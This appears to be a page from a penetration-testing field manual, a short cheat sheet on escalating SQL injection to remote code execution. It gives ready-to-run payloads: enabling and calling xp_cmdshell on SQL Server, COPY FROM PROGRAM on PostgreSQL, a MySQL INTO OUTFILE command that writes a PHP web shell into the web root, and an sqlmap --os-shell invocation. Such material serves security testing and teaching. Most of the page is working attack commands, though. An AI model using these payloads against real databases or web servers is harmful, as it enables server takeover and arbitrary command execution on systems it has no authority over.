---
layout:
  width: default
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: false
  metadata:
    visible: true
---

# SQLi to RCE

**SQL Injections can be leveraged to achieve Remote Code Execution (RCE)** when an attacker gains control over database queries and exploits specific database features or functions that allow command execution.

This is possible in cases where the database has functions that allow system command execution, such as:

* **`xp_cmdshell` (SQL Server)**: Executes system commands directly from the database.
* **`SELECT INTO OUTFILE` (MySQL)** â€“ Allows writing files to disk, which can be used to drop a malicious web shell into a web-accessible directory.
* **`COPY FROM PROGRAM` (PostgreSQL)**: Executes system commands by copying output from an external program into the database.

***

## Cheatsheet

| Action                                                                                                                                                                                                                                                                                                                      | Description                                                                                                                                                                                                                                                  |
| --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| <p>Enables the stored procedure:<br><code>EXECUTE sp_configure 'show advanced</code> </p><p><code>options', 1;</code><br><code>RECONFIGURE;</code><br><code>EXECUTE sp_configure 'xp_cmdshell', 1;</code><br><code>RECONFIGURE;</code><br><br>Executes a command:<br><code>EXECUTE xp_cmdshell '&#x3C;command>';</code></p> | **MSSQL**: Enables and executes system commands through the `xp_cmdshell` stored procedure, which is disabled by default in SQL Server 2005 and later.                                                                                                       |
| <p>Creates a table to store the command output:<br><code>CREATE TABLE shell(output text);</code><br><br>Executes a command:<br><code>COPY shell FROM PROGRAM '&#x3C;command>';</code><br><br>Read output from command:<br><code>SELECT * FROM shell;</code></p>                                                             | <p><strong>PostgreSQL</strong>: Uses the <code>COPY FROM PROGRAM</code> feature to execute system commands.<br><br>This feature is only available from <strong>PostgreSQL 9.3 and above</strong>.</p>                                                        |
| <p><code>SELECT "&#x3C;?php system($_GET['cmd']); ?>" INTO OUTFILE "/var/www/html/shell.php"</code><br><br></p>                                                                                                                                                                                                             | <p><strong>MySQL</strong>: Writes a PHP web shell (<code>shell.php</code>) into a web-accessible directory, if we have the <strong>necessary privileges</strong>.<br><br>The file location must be writable to the OS user running the database service.</p> |
| <p><code>sqlmap ... --os-shell --web-root</code> </p><p><code>"/var/www/html"</code></p>                                                                                                                                                                                                                                    | Automates the process of spawning a semi-interactive web shell using [sqlmap](https://field-manual.brunorochamoura.com/manual/exploitation/service-exploitation/tools/sqlmap/), bypassing the need for manual exploitation and working across different DBMS |

{% hint style="info" %}
#### Additional Resources

Additional techniques can be found in the PayloadsAllTheThings repository.
{% endhint %}
